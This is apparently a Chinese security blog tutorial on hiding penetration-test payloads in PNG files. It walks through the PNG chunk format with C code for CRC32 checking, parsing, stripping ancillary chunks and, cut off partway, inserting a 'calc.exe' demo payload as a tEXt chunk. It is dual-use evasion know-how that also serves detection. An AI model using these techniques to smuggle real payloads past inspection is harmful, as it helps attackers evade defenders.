I"À`<h2 id="0x00-å‰è¨€">0x00 å‰è¨€</h2>
<hr />
<p>éšå†™æœ¯(Steganography)ç”±æ¥å·²ä¹…ï¼Œå…¶ä¸­æœ‰å¾ˆå¤šå¥½ç©å„¿çš„ç»†èŠ‚ï¼Œæ‰€ä»¥æ‰“ç®—ç³»ç»Ÿçš„ç ”ç©¶ä¸€ä¸‹ï¼Œè¿™æ¬¡å…ˆä»PNGçš„æ–‡ä»¶æ ¼å¼å¼€å§‹ã€‚
<img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/0.jpg" alt="Alt text" /></p>

<blockquote>
  <p>å›¾ç‰‡æ¥è‡ªäºhttp://null-byte.wonderhowto.com/how-to/guide-steganography-part-1-hide-secret-messages-images-0130797/</p>
</blockquote>

<h2 id="0x01-ç®€ä»‹">0x01 ç®€ä»‹</h2>
<hr />

<p>éšå†™æœ¯å¯ä»¥ç†è§£ä¸ºä¿¡æ¯éšè—ï¼Œåœ¨æ¸—é€æµ‹è¯•ä¸­æœ€ä¸»è¦çš„åº”ç”¨æ˜¯å¯¹Payloadçš„éšè—ã€‚æœ¬æ–‡ä¼šå¯¹PNGçš„æ–‡ä»¶æ ¼å¼è¿›è¡Œåˆ†æï¼Œç¼–å†™cç¨‹åºå®ç°è‡ªåŠ¨è§£ææ–‡ä»¶æ ¼å¼ï¼Œå¹¶æŒ‰ç…§å…¶æ–‡ä»¶æ ¼å¼æ·»åŠ è‡ªå®šä¹‰çš„payloadï¼Œä¸ä»…ä¸ä¼šå½±å“å›¾ç‰‡çš„æ­£å¸¸æµè§ˆï¼ŒåŒæ—¶å¯å°†å›¾ç‰‡ä¸Šä¼ åˆ°ç½‘ç»œï¼Œä½¿ç”¨æ—¶å°†å›¾ç‰‡ä¸‹è½½å†ä»¥ç‰¹å®šæ ¼å¼è§£å¯†ï¼Œæœ€ç»ˆæ‰§è¡Œpayloadã€‚</p>

<p><strong>æ³¨ï¼š</strong></p>

<p>æ‰€æœ‰ç¨‹åºæºç å·²ä¸Šä¼ githubï¼Œåœ°å€ä¸ºï¼š
https://github.com/3gstudent/PNG-Steganography</p>

<h2 id="0x02-pngæ–‡ä»¶æ ¼å¼">0x02 PNGæ–‡ä»¶æ ¼å¼</h2>
<hr />

<h3 id="1pngæ–‡ä»¶ç½²ååŸŸ">1ã€PNGæ–‡ä»¶ç½²ååŸŸ</h3>
<p>å‰8å­—èŠ‚</p>

<p>å›ºå®šæ ¼å¼ï¼Œ16è¿›åˆ¶ä¸ºï¼š
<code class="language-plaintext highlighter-rouge">89 50 4e 47 0d 0a 1a 0a </code></p>

<h3 id="2æ•°æ®å—">2ã€æ•°æ®å—</h3>

<p>Chunk Type Code(æ•°æ®å—ç±»å‹ç ): 4å­—èŠ‚,æ•°æ®å—ç±»å‹ç </p>

<p>Chunk Data(æ•°æ®å—æ•°æ®): å¯å˜é•¿åº¦,å­˜å‚¨æ•°æ®</p>

<p>CRC(å¾ªç¯å†—ä½™æ£€æµ‹): 4å­—èŠ‚,å­˜å‚¨ç”¨æ¥æ£€æµ‹æ˜¯å¦æœ‰é”™è¯¯çš„å¾ªç¯å†—ä½™ç </p>

<p><strong>æ•°æ®å—ç±»å‹ï¼š</strong></p>

<p><strong>1. å…³é”®æ•°æ®å—(critical chunk)</strong></p>

<p>(1) æ–‡ä»¶å¤´æ•°æ®å—IHDR(header chunk)</p>
<ul>
  <li>åŒ…å«PNGæ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯</li>
  <li>ä¸€ä¸ªPNGæ•°æ®æµä¸­åªèƒ½æœ‰ä¸€ä¸ªIHDR</li>
  <li><strong>å¿…é¡»åœ¨PNGæ–‡ä»¶æœ€å‰é¢</strong></li>
</ul>

<p>(2) è°ƒè‰²æ¿æ•°æ®å—PLTE(palette chunk)</p>
<ul>
  <li>åŒ…å«æœ‰ä¸ç´¢å¼•å½©è‰²å›¾åƒ(indexed-color image)ç›¸å…³çš„å½©è‰²å˜æ¢æ•°æ®</li>
  <li><strong>å¿…é¡»åœ¨IDATä¹‹å‰</strong></li>
</ul>

<p>(3) å›¾åƒæ•°æ®å—IDAT(image data chunk)</p>
<ul>
  <li>å­˜å‚¨å®é™…çš„æ•°æ®</li>
  <li>å¯å­˜åœ¨å¤šä¸ª</li>
  <li><strong>å¿…é¡»ä¸å…¶ä»–IDATè¿ç»­</strong></li>
</ul>

<p>(4) å›¾åƒç»“æŸæ•°æ®IEND(image trailer chunk)</p>
<ul>
  <li>å›ºå®šæ ¼å¼ï¼Œ16è¿›åˆ¶ä¸ºï¼š
<code class="language-plaintext highlighter-rouge">00 00 00 00 49 45 4E 44 AE 42 60 82</code></li>
  <li><strong>å¿…é¡»åœ¨PNGæ–‡ä»¶æœ€å°¾éƒ¨</strong></li>
</ul>

<p><strong>2. è¾…åŠ©æ•°æ®å—(ancillary chunk)</strong></p>

<p>ç”¨äºè¾…åŠ©æŒ‡ç¤ºPNGå›¾åƒä¸­çš„å±‚ã€æ–‡å­—ç­‰ä¿¡æ¯</p>

<p><strong>å¯åˆ é™¤ï¼Œä¸å½±å“å›¾ç‰‡æµè§ˆï¼Œä½†å›¾åƒå°†å¤±å»åŸæ¥çš„å¯ç¼–è¾‘æ€§</strong></p>

<p>(1) èƒŒæ™¯é¢œè‰²æ•°æ®å—bKGD(background color)</p>

<p>(2) åŸºè‰²å’Œç™½è‰²åº¦æ•°æ®å—cHRM(primary chromaticities and white point)</p>

<p>(3) å›¾åƒÎ³æ•°æ®å—gAMA(image gamma)</p>

<p>(4) å›¾åƒç›´æ–¹å›¾æ•°æ®å—hIST(image histogram)</p>

<p>(5) ç‰©ç†åƒç´ å°ºå¯¸æ•°æ®å—pHYs(physical pixel dimensions)</p>

<p>(6) æ ·æœ¬æœ‰æ•ˆä½æ•°æ®å—sBIT(significant bits)</p>

<p>(7) æ–‡æœ¬ä¿¡æ¯æ•°æ®å—tEXt(textual data)</p>

<p>(8) å›¾åƒæœ€åä¿®æ”¹æ—¶é—´æ•°æ®å—tIME (image last-modification time)</p>

<p>(9) å›¾åƒé€æ˜æ•°æ®å—tRNS (transparency)</p>

<p>(10) å‹ç¼©æ–‡æœ¬æ•°æ®å—zTXt (compressed textual data)</p>

<h2 id="0x03-å®ä¾‹æ ¼å¼åˆ†æ">0x03 å®ä¾‹æ ¼å¼åˆ†æ</h2>
<hr />

<p>å·¥å…·ï¼š<code class="language-plaintext highlighter-rouge">Hex Editor</code></p>

<p><strong>ä¼˜ç‚¹ï¼š</strong></p>

<p>å¯å¯¹16è¿›åˆ¶å­—ç¬¦ä¸²è¿›è¡Œæ ‡è®°ï¼Œè®¾ç½®é¢œè‰²ï¼Œæ–¹ä¾¿æ ¼å¼åˆ†æ</p>

<p><strong>æµ‹è¯•æ–‡ä»¶ï¼š</strong></p>

<p>å¦‚å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/test.png" alt="Alt text" /></p>

<p><strong>æºä¸‹è½½åœ°å€ï¼š</strong></p>

<p>http://www.easyicon.net/language.en/1172671-png_icon.html</p>

<p>æ ‡è®°å¥½çš„æ–‡ä»¶æ ¼å¼å¦‚å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-1.PNG" alt="Alt text" /></p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-2.PNG" alt="Alt text" /></p>

<h3 id="1-pngæ–‡ä»¶ç½²ååŸŸ">(1) PNGæ–‡ä»¶ç½²ååŸŸ</h3>

<p>å›ºå®šæ ¼å¼ï¼š</p>

<p><code class="language-plaintext highlighter-rouge">89 50 4e 47 0d 0a 1a 0a </code></p>

<h3 id="2-ihdr">(2) IHDR</h3>

<p>00000008h: 00 00 00 0D 49 48 44 52 00 00 00 1A 00 00 00 1A ; â€¦.IHDRâ€¦â€¦..
00000018h: 08 04 00 00 00 03 43 84 45                      ; â€¦â€¦Cå‡Ÿ</p>

<p><strong>æ•°æ®å—ç»“æ„ï¼š</strong></p>

<p><strong>Length:</strong>	
<code class="language-plaintext highlighter-rouge">00 00 00 0D</code></p>

<p>å‰4å­—èŠ‚ï¼Œå®šä¹‰é•¿åº¦ï¼Œ00 00 00 0Dåè¿›åˆ¶ä¸º13ï¼Œä»£è¡¨é•¿åº¦ä¸º13ä¸ªå­—èŠ‚</p>

<p><strong>Chunk Type Codeï¼š</strong>		
<code class="language-plaintext highlighter-rouge">49 48 44 52</code></p>

<p>4å­—èŠ‚ï¼Œå®šä¹‰æ•°æ®å—ç±»å‹ç ï¼Œæ­¤å¤„ä¸ºIHDR</p>

<p><strong>Chunk Dataï¼š</strong>
<code class="language-plaintext highlighter-rouge">00 00 00 1A 00 00 00 1A 08 04 00 00 00 </code></p>

<p>å…±13å­—èŠ‚ï¼Œå®šä¹‰æ•°æ®å†…å®¹</p>

<p><strong>CRCï¼š</strong>
4å­—èŠ‚ï¼Œå¯¹Chunk Type Code+Chunk Dataä½œCRC32è®¡ç®—å¾—å‡ºçš„å€¼</p>

<p>å³å¯¹ä»¥ä¸‹åå…­è¿›åˆ¶ä½œè®¡ç®—ï¼š
<code class="language-plaintext highlighter-rouge">49 48 44 52 00 00 00 1A 00 00 00 1A 08 04 00 00 00</code></p>

<p>ç¼–å†™ç¨‹åºå¯¹CRCç®—æ³•è¿›è¡ŒéªŒè¯ï¼Œä¿å­˜ä¸ºexample1.cpp,æºä»£ç å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;string.h&gt;
unsigned int GetCrc32(char* InStr,unsigned int len){        
  unsigned int Crc32Table[256];      
  int i,j;        
  unsigned int Crc;        
  for (i = 0; i &lt; 256; i++){        
	Crc = i;        
	for (j = 0; j &lt; 8; j++){        
	  if (Crc &amp; 1)        
		Crc = (Crc &gt;&gt; 1) ^ 0xEDB88320;        
	  else       
		Crc &gt;&gt;= 1;      
	}        
	Crc32Table[i] = Crc;        
  }        
	
  Crc=0xffffffff;        
  for(int m=0; m&lt;len; m++){          
	Crc = (Crc &gt;&gt; 8) ^ Crc32Table[(Crc &amp; 0xFF) ^ InStr[m]];        
  }     
	   
  Crc ^= 0xFFFFFFFF;     
  return Crc;        
}        
int main(int argc, char* argv[])
{
	char buf[17]={0x49,0x48,0x44,0x52,0x00,0x00,0x00,0x1A,0x00,0x00,0x00,0x1A,0x08,0x04,0x00,0x00,0x00};
	unsigned int crc32=GetCrc32(buf,sizeof(buf));
	printf("%08X\n",crc32);
	return 0;
}
</code></pre></div></div>

<p>è¿è¡Œåå¦‚å›¾ï¼Œè¾“å‡º<code class="language-plaintext highlighter-rouge">03438445</code>ï¼ŒåŒæ–‡ä»¶ä¸­çš„CRC32æ ¡éªŒç ç›¸åŒ</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-3.png" alt="Alt text" /></p>

<h3 id="3-gama">(3) gAMA</h3>

<p>00000021h: 00 00 00 04 67 41 4D 41 00 00 B1 8F 0B FC 61 05 ; â€¦.gAMA..ç†.é»™.</p>

<p><strong>æ•°æ®å—ç»“æ„ï¼š</strong></p>

<p>Length:				<code class="language-plaintext highlighter-rouge">00 00 00 04</code></p>

<p>Chunk Type Codeï¼š	<code class="language-plaintext highlighter-rouge">67 41 4D 41</code></p>

<p>Chunk Dataï¼š		<code class="language-plaintext highlighter-rouge">00 00 B1 8F</code></p>

<p>CRCï¼š				<code class="language-plaintext highlighter-rouge">0B FC 61 05</code></p>

<h3 id="4-chrm">(4) cHRM</h3>
<p>00000031h: 00 00 00 20 63 48 52 4D 00 00 7A 26 00 00 80 84 ; â€¦ cHRM..z&amp;..â‚¬?
00000041h: 00 00 FA 00 00 00 80 E8 00 00 75 30 00 00 EA 60 ; ..?..â‚¬?.u0..é˜˜
00000051h: 00 00 3A 98 00 00 17 70 9C BA 51 3C             ; ..:?..pæº€Q&lt;</p>

<p><strong>æ•°æ®å—ç»“æ„ï¼š</strong></p>

<p>Length:				<code class="language-plaintext highlighter-rouge">00 00 00 20</code></p>

<p>Chunk Type Codeï¼š	<code class="language-plaintext highlighter-rouge">63 48 52 4D</code></p>

<p>Chunk Dataï¼š			<code class="language-plaintext highlighter-rouge">00 00 7A 26 00 00 80 84 00 00 FA 00 00 00 80 E8 00 00 75 30 00 00 EA 60 00 00 3A 98 00 00 17 70</code></p>

<p>CRCï¼š				<code class="language-plaintext highlighter-rouge">9C BA 51 3C</code></p>

<h3 id="5-idat">(5) IDAT</h3>

<p>(6-14) tEXt</p>

<p>(15)IEND</p>

<p><strong>æ•°æ®å—ç»“æ„ï¼š</strong></p>

<p>Length:				<code class="language-plaintext highlighter-rouge">00 00 00 00</code></p>

<p>Chunk Type Codeï¼š	<code class="language-plaintext highlighter-rouge">49 45 4E 44</code></p>

<p>Chunk Dataï¼š</p>

<p>CRCï¼š				<code class="language-plaintext highlighter-rouge">AE 42 60 82</code></p>

<p>å›ºå®šç»“æ„ï¼ŒCRCçš„å€¼ä¸ºå¯¹Chunk Type Codeä½œCRC32æ ¡éªŒ</p>

<p>å¦‚å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-4.png" alt="Alt text" /></p>

<h2 id="0x04-ç¼–å†™ç¨‹åºåˆ†ææ–‡ä»¶æ ¼å¼">0x04 ç¼–å†™ç¨‹åºåˆ†ææ–‡ä»¶æ ¼å¼</h2>
<hr />
<p>å¼€å‘å·¥å…·ï¼š<code class="language-plaintext highlighter-rouge">vc6.0</code></p>

<h3 id="1è¯»å–pngæ–‡ä»¶">1ã€è¯»å–PNGæ–‡ä»¶</h3>

<p>ä¿å­˜ä¸ºexample2.cppï¼Œä»£ç å¦‚ä¸‹:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include&lt;stdio.h&gt;
#include&lt;string.h&gt;
int main(int argc, char* argv[])
{
	FILE *fp;   
	if((fp=fopen("c:\\test\\test.png","rb+"))==NULL)
		return 0;   
	fseek(fp,0,SEEK_END);
	int len=ftell(fp);
	unsigned char *buf=new unsigned char[len];	
	fseek(fp,0,SEEK_SET);
	fread(buf,len,1,fp);
	printf("len=%d\n",len);
	for(int i=1;i&lt;=len;i++)
	{
		printf("%02X ",buf[i-1]);
		if(i%16==0)
			printf("\n");
	}
	fclose(fp);
	printf("\n");
	return 0;	
}
</code></pre></div></div>

<p>å¦‚å›¾ï¼Œç¨‹åºæŒ‰ç…§UltraEditçš„æ ¼å¼è¾“å‡ºï¼Œä»¥ä¾¿åç»­çš„æ ¼å¼åˆ†æ</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-5.PNG" alt="Alt text" /></p>

<h3 id="2è§£ææ•°æ®å—ç»“æ„">2ã€è§£ææ•°æ®å—ç»“æ„</h3>

<p>ä»ç¬¬8å­—èŠ‚å¼€å§‹ï¼Œè¯»å‰å››å­—èŠ‚ä¸ºChunkLength</p>

<p>å¯¹åº”çš„ä»£ç ä¸ºï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unsigned int ChunkLen=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3];
</code></pre></div></div>

<p>æ¥ç€å››å­—èŠ‚ä¸ºChunkName</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>printf("ChunkName:%c%c%c%c\n",buf[0],buf[1],buf[2],buf[3]);
</code></pre></div></div>

<p>ç„¶åæ ¹æ®ChunkLengthè¯»å‡ºå®Œæ•´çš„ChunkData</p>

<p>æœ€åè¯»å‡ºCRC32çš„å€¼,åŒChunk Type Code+Chunk Dataæ±‚å‡ºçš„CRC32æ ¡éªŒå€¼ä½œæ¯”è¾ƒ</p>

<p>ä¿å­˜ä¸ºcheck.cpp,å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include&lt;stdio.h&gt;
#include&lt;string.h&gt;

unsigned int GetCrc32(unsigned char* InStr,unsigned int len){        
	unsigned int Crc32Table[256];      
	unsigned int i,j;        
	unsigned int Crc;        
	for (i = 0; i &lt; 256; i++){        
		Crc = i;        
		for (j = 0; j &lt; 8; j++){        
			if (Crc &amp; 1)        
				Crc = (Crc &gt;&gt; 1) ^ 0xEDB88320;        
			else       
				Crc &gt;&gt;= 1;      
		}        
		Crc32Table[i] = Crc;        
	}        
	
	Crc=0xffffffff;        
	for(unsigned int m=0; m&lt;len; m++){          
		Crc = (Crc &gt;&gt; 8) ^ Crc32Table[(Crc &amp; 0xFF) ^ InStr[m]];        
	}     
	
	Crc ^= 0xFFFFFFFF;     
	return Crc;        
}        

int main(int argc, char* argv[])
{
	FILE *fp;   
	unsigned char *buf=NULL;
	unsigned int len=0;
	unsigned int ChunkLen=0;
	unsigned int ChunkCRC32=0;
	unsigned int ChunkOffset=0;	
	unsigned int crc32=0;
	unsigned int i=0;
	if((fp=fopen("c:\\test\\test.png","rb+"))==NULL)
		return 0;   
	fseek(fp,0,SEEK_END);
	len=ftell(fp);
	buf=new unsigned char[len];
	fseek(fp,0,SEEK_SET);
	fread(buf,len,1,fp);
	printf("Total Len=%d\n",len);
	printf("----------------------------------------------------\n");
	fseek(fp,8,SEEK_SET);
	ChunkOffset=8;
	i=0;
	while(1)
	{
		i++;
		memset(buf,0,len);
		fread(buf,4,1,fp);
		ChunkLen=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3];
		fread(buf,4+ChunkLen,1,fp);
		printf("[+]ChunkName:%c%c%c%c		",buf[0],buf[1],buf[2],buf[3]);
		if(strncmp((char *)buf,"IHDR",4)==0|strncmp((char *)buf,"PLTE",4)==0|strncmp((char *)buf,"IDAT",4)==0)
			printf("Palette Chunk\n");
		printf("Ancillary Chunk\n");
		printf("   ChunkOffset:0x%08x	\n",ChunkOffset);
		printf("   ChunkLen: %10d		\n",ChunkLen);
		ChunkOffset+=ChunkLen+12;
		crc32=GetCrc32(buf,ChunkLen+4);
		printf("   ExpectCRC32:%08X\n",crc32);
		fread(buf,4,1,fp);
		ChunkCRC32=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3];
		printf("   ChunkCRC32: %08X		",ChunkCRC32);
		if(crc32!=ChunkCRC32)
			printf("[!]CRC32Check Error!\n");
		else
			printf("Check Success!\n\n");
		ChunkLen=ftell(fp);
		if(ChunkLen==(len-12))
		{
			printf("\n----------------------------------------------------\n");
			printf("Total Chunk:%d\n",i);		
			break;
		}
	}
	fclose(fp);
	return 0;	
}
</code></pre></div></div>

<p>è¿è¡Œå¦‚å›¾ï¼Œå¯è·å¾—å®Œæ•´çš„PNGæ–‡ä»¶ç»“æ„</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-6.PNG" alt="Alt text" /></p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-7.PNG" alt="Alt text" /></p>

<p><strong>æ³¨ï¼š</strong></p>

<p>è¿™ä¸ªç¨‹åºå¯ç”¨æ¥å¯¹PNGæ–‡ä»¶è¿›è¡Œæ ¼å¼åˆ†æï¼Œæ ‡è®°PNGæ–‡ä»¶çš„æ•°æ®å—åç§°ã€åç§»åœ°å€ã€æ•°æ®å—é•¿åº¦ã€æ¯”è¾ƒé¢„æœŸå’Œå®é™…çš„CRC32æ ¡éªŒç ï¼Œå¯åŸºäºæ­¤å¯¹æ‰¹é‡æ–‡ä»¶è¿›è¡Œåˆ†æï¼ŒæŸ¥æ‰¾å¯ç–‘æ–‡ä»¶ã€‚</p>

<p>åç»­ä¼šè¡¥å……pythonçš„å®ç°ä»£ç </p>

<h2 id="0x05-å»é™¤å¤šä½™æ•°æ®">0x05 å»é™¤å¤šä½™æ•°æ®</h2>
<hr />
<p>ä¸Šé¢æåˆ°ï¼Œå»é™¤è¾…åŠ©æ•°æ®å—çš„å†…å®¹å¯¹PNGå›¾åƒçš„æµè§ˆæ²¡æœ‰å½±å“ï¼Œä¸‹é¢å°±å°è¯•å»é™¤PNGæ–‡ä»¶çš„æ‰€æœ‰è¾…åŠ©æ•°æ®å—</p>

<h3 id="1å·¥å…·å®ç°">1ã€å·¥å…·å®ç°</h3>

<p>å¦‚å›¾ï¼Œä½¿ç”¨<code class="language-plaintext highlighter-rouge">Hex Editor</code>å»é™¤è¾…åŠ©æ•°æ®å—gAMAã€cHRMå’ŒbKGD</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-8.PNG" alt="Alt text" /></p>

<p>å¦‚å›¾ï¼Œæ–‡ä»¶å¤§å°å˜åŒ–ï¼Œä½†ä¸å½±å“PNGæ–‡ä»¶æµè§ˆ</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-9.png" alt="Alt text" /></p>

<h3 id="2ç¨‹åºå®ç°">2ã€ç¨‹åºå®ç°</h3>

<p>å»é™¤æ‰€æœ‰è¾…åŠ©æ•°æ®å—ï¼Œåªæå–å…³é”®ä¿¡æ¯ã€‚ç¨‹åºå…ˆå¯¹ChunkNameä½œåˆ¤æ–­ï¼Œå¿½ç•¥éå…³é”®æ•°æ®å—(Ancillary Chunk)çš„å†…å®¹ï¼Œå¹¶ä¿å­˜ä¸ºnew.png</p>

<p>ä¿å­˜ä¸ºcompress.cpp,å®Œæ•´ä»£ç ä¸ºï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include&lt;stdio.h&gt;
#include&lt;string.h&gt;

unsigned int GetCrc32(unsigned char* InStr,unsigned int len){        
	unsigned int Crc32Table[256];      
	unsigned int i,j;        
	unsigned int Crc;        
	for (i = 0; i &lt; 256; i++){        
		Crc = i;        
		for (j = 0; j &lt; 8; j++){        
			if (Crc &amp; 1)        
				Crc = (Crc &gt;&gt; 1) ^ 0xEDB88320;        
			else       
				Crc &gt;&gt;= 1;      
		}        
		Crc32Table[i] = Crc;        
	}        
	
	Crc=0xffffffff;        
	for(unsigned int m=0; m&lt;len; m++){          
		Crc = (Crc &gt;&gt; 8) ^ Crc32Table[(Crc &amp; 0xFF) ^ InStr[m]];        
	}     
	
	Crc ^= 0xFFFFFFFF;     
	return Crc;        
}        

int main(int argc, char* argv[])
{
	FILE *fp,*fpnew;   
	unsigned char *buf=NULL;
	unsigned int len=0;
	unsigned int ChunkLen=0;
	unsigned int ChunkCRC32=0;
	unsigned int ChunkOffset=0;	
	unsigned int crc32=0;
	unsigned int i=0,j=0;
	unsigned char Signature[8]={0x89,0x50,0x4e,0x47,0x0d,0x0a,0x1a,0x0a};	
	unsigned char IEND[12]={0x00,0x00,0x00,0x00,0x49,0x45,0x4e,0x44,0xae,0x42,0x60,0x82};	   
	
	if((fp=fopen("c:\\test\\0.png","rb+"))==NULL)
		return 0;  
	if((fpnew=fopen("c:\\test\\new.png","wb"))==NULL)
		return 0;  
	fseek(fp,0,SEEK_END);
	len=ftell(fp);
	buf=new unsigned char[len];
	fseek(fp,0,SEEK_SET);
	fread(buf,len,1,fp);
	printf("Total Len=%d\n",len);
	printf("----------------------------------------------------\n");
	fseek(fp,8,SEEK_SET);
	ChunkOffset=8;
	i=0; 
	fwrite(Signature,8,1,fpnew);
	while(1)
	{
		i++;
		j=0;
		memset(buf,0,len);
		fread(buf,4,1,fp);
		fwrite(buf,4,1,fpnew);
		ChunkLen=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3];
		fread(buf,4+ChunkLen,1,fp);
		printf("[+]ChunkName:%c%c%c%c		",buf[0],buf[1],buf[2],buf[3]);
		if(strncmp((char *)buf,"IHDR",4)==0|strncmp((char *)buf,"PLTE",4)==0|strncmp((char *)buf,"IDAT",4)==0)
		{	
			printf("Palette Chunk\n");

			fwrite(buf,4+ChunkLen,1,fpnew);
		}
		else
		{
			printf("Ancillary Chunk\n");
			fseek(fpnew,-4,SEEK_CUR);
			j=1;
		}
		printf("   ChunkOffset:0x%08x	\n",ChunkOffset);
		printf("   ChunkLen: %10d		\n",ChunkLen);
		crc32=GetCrc32(buf,ChunkLen+4);
		printf("   ExpectCRC32:%08X\n",crc32);
		fread(buf,4,1,fp);
		ChunkCRC32=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3];
		printf("   ChunkCRC32: %08X		",ChunkCRC32);
		if(crc32!=ChunkCRC32)
			printf("[!]CRC32Check Error!\n");
		else
		{
			printf("Check Success!\n\n");
			if(j==0)
				fwrite(buf,4,1,fpnew);
		}
		ChunkLen=ftell(fp);
		if(ChunkLen==(len-12))
		{
			printf("\n----------------------------------------------------\n");
			printf("Total Chunk:%d\n",i);		
			break;
		}
	}
	fwrite(IEND,12,1,fpnew);
	fclose(fp);
	fclose(fpnew);
	return 0;	
}
</code></pre></div></div>

<p>å¦‚å›¾ï¼Œå·¦è¾¹ä¸ºåŸå§‹PNGæ–‡ä»¶å¤§å°ï¼Œå³è¾¹ä¸ºå»æ‰æ‰€æœ‰è¾…åŠ©æ•°æ®å—åçš„æ–‡ä»¶ï¼Œä»ç„¶å¯ä»¥æ­£å¸¸æµè§ˆ</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-10.png" alt="Alt text" /></p>

<h2 id="0x06-å†™å…¥payload">0x06 å†™å…¥Payload</h2>
<hr />
<p><strong>å®ä¾‹ï¼š</strong></p>

<p>æŒ‰ç…§è¾…åŠ©æ•°æ®å—çš„æ ¼å¼å†™å…¥Payload</p>

<p>å†™å…¥çš„Payloadä¸º:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>calc.exe
</code></pre></div></div>

<p>è¾…åŠ©æ•°æ®å—è®¾ç½®ä¸ºï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tEXt
</code></pre></div></div>

<p>å¯¹åº”çš„å®Œæ•´æ•°æ®å—ç»“æ„å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Length:				00 00 00 08
Chunk Type Codeï¼š	74 45 58 74
Chunk Dataï¼š			63 61 6c 63 2e 65 78 65
CRCï¼š				fa c4 08 76
</code></pre></div></div>

<p>å†™å…¥çš„åå…­è¿›åˆ¶æ•°æ®å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>00 00 00 08 74 45 58 74 63 61 6c 63 2e 65 78 65 fa c4 08 76
</code></pre></div></div>

<p><strong>æ³¨ï¼š</strong>
æœ¬å®ä¾‹ä»…ä½œæ¼”ç¤ºï¼Œå®é™…ä½¿ç”¨å¯æ¢æˆå…¶ä»–æ•°æ®å—ï¼Œæ›´åŠ éšè”½</p>

<h3 id="1å·¥å…·å®ç°-1">1ã€å·¥å…·å®ç°</h3>

<p>ä½¿ç”¨<code class="language-plaintext highlighter-rouge">Hex Editor</code>æ’å…¥æ•°æ®ï¼Œå¦‚å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-11.PNG" alt="Alt text" /></p>

<p>ä¿å­˜åï¼Œä¸å½±å“PNGæ–‡ä»¶æµè§ˆ</p>

<h3 id="2ç¨‹åºå®ç°-1">2ã€ç¨‹åºå®ç°</h3>

<p>å»æ‰PNGæ–‡ä»¶æ‰€æœ‰çš„è¾…åŠ©æ•°æ®å—åï¼Œå†™å…¥payloadæ•°æ®å—tEXt</p>

<p>ä¿å­˜ä¸ºaddpayload.cpp,å®Œæ•´ä»£ç ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include&lt;stdio.h&gt;
#include&lt;string.h&gt;

unsigned int GetCrc32(unsigned char* InStr,unsigned int len){        
	unsigned int Crc32Table[256];      
	unsigned int i,j;        
	unsigned int Crc;        
	for (i = 0; i &lt; 256; i++){        
		Crc = i;        
		for (j = 0; j &lt; 8; j++){        
			if (Crc &amp; 1)        
				Crc = (Crc &gt;&gt; 1) ^ 0xEDB88320;        
			else       
				Crc &gt;&gt;= 1;      
		}        
		Crc32Table[i] = Crc;        
	}        
	
	Crc=0xffffffff;        
	for(unsigned int m=0; m&lt;len; m++){          
		Crc = (Crc &gt;&gt; 8) ^ Crc32Table[(Crc &amp; 0xFF) ^ InStr[m]];        
	}     
	
	Crc ^= 0xFFFFFFFF;     
	return Crc;        
}        

void convertStrToUnChar(char* str, unsigned char* UnChar)  
{  
	int i = strlen(str), j = 0, counter = 0;  
	char c[2];  
	unsigned int bytes[2];  
  
	for (j = 0; j &lt; i; j += 2)   
	{  
		if(0 == j % 2)  
		{  
			c[0] = str[j];  
			c[1] = str[j + 1];  
			sscanf(c, "%02x" , &amp;bytes[0]);  
			UnChar[counter] = bytes[0];  
			counter++;  
		}  
	}  
	return;  
}     

void AddPayload(FILE *fp)
{
	char *Payload="calc.exe";
	unsigned char *buf;
	int len;
	int crc32;
	len=strlen(Payload);	
	buf=new unsigned char[len+12];
	buf[0]=len&gt;&gt;24&amp;0xff;
	buf[1]=len&gt;&gt;16&amp;0xff;
	buf[2]=len&gt;&gt;8&amp;0xff;
	buf[3]=len&amp;0xff;
	buf[4]='t';
	buf[5]='E';
	buf[6]='X';
	buf[7]='t';
	for(int j=0;j&lt;len;j++)
		buf[j+8]=Payload[j];
	buf[len+8]=0XFA;
